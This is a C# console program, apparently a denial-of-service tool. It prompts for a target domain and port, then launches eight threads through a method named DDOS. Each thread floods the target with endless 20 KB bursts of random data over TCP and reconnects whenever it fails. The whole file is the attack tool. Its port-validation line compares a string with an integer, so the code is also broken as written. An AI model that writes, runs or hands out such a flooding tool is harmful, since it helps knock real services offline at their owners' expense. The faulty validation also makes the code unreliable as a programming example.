using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text.RegularExpressions;

class Program
{
    public static string IP;
    public static int Port;
    public static int count = 0;
    static void Main()
    {
        Console.Clear();
        Console.Write("服务器 |  Server: ");
        bool isDomainName = false;
        string DomainPattern = @"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$";
        Regex ymregex = new Regex(DomainPattern);
        while (!isDomainName)
        {
            Program.IP = Console.ReadLine();
            isDomainName = ymregex.IsMatch(Program.IP);
            if (!isDomainName)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n非法地址 | Invalid input");
                Console.ResetColor();
            }
        }
        while (true)
        {
            Console.Write("端口   |  Port  : ");
            if (int.TryParse(Console.ReadLine(), out Program.Port) && Console.ReadLine() < 65536)
            {
                break;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n非法端口 | Invalid input");
                Console.ResetColor();
            }
        }
        //Console.CursorVisible = false;
        for (int i = 0; i < 8; i++)
        {
            Thread t = new Thread(DDOS);
            t.Start();
        }
    }
    static void DDOS()
    {
        reclient:
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        try
        {
            socket.Connect(Program.IP, Program.Port);
            Console.WriteLine("连接成功 | Connect success.");
        }
        catch (Exception e)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("连接失败 | Connect faild");
            Console.ResetColor();
        }
        string randomString = GenerateRandomString(20480);
        byte[] data = Encoding.UTF8.GetBytes(randomString);
        while (true)
        {
            Program.count++;
            try
            {
                socket.Send(data);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("Success\u0020");
                Console.ResetColor();
                Console.Write(Program.count);
            }
            catch (Exception e)
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("在发送第" + Program.count + "时发送问题" + e.Message);
                Console.ResetColor();
                goto reclient;
            }
        }
    }
    static string GenerateRandomString(int sizeInBytes)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
        StringBuilder rd = new StringBuilder(sizeInBytes);
        Random random = new Random();
        for (int i = 0; i < sizeInBytes; i++)
        {
            rd.Append(chars[random.Next(chars.Length)]);
        }
        return rd.ToString();
    }
}
